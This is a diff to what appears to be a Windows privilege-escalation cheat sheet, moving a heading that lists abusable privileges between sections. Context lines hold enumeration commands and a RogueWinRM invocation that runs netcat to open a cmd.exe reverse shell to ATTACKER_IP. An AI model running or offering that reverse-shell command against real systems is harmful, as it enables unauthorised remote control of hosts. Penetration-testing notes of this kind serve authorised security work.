@@ -184,6 +184,7 @@ net user
 ```
 
   #### Windows Privileges - SeBackup / SeRestore
+    ###### may lead to privilege escalation are SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug
     whoami /priv
       SeBackupPrivilege             Back up files and directories  Disabled
       SeRestorePrivilege            Restore files and directories  Disabled
@@ -207,7 +208,7 @@ net user
     
   
   #### Windows Privileges - SeImpersonate / SeAssignPrimaryToken
-  ###### may lead to privilege escalation are SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug
+
     RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
   #### app vuln
     wmic product get name,version,vendor //list apps
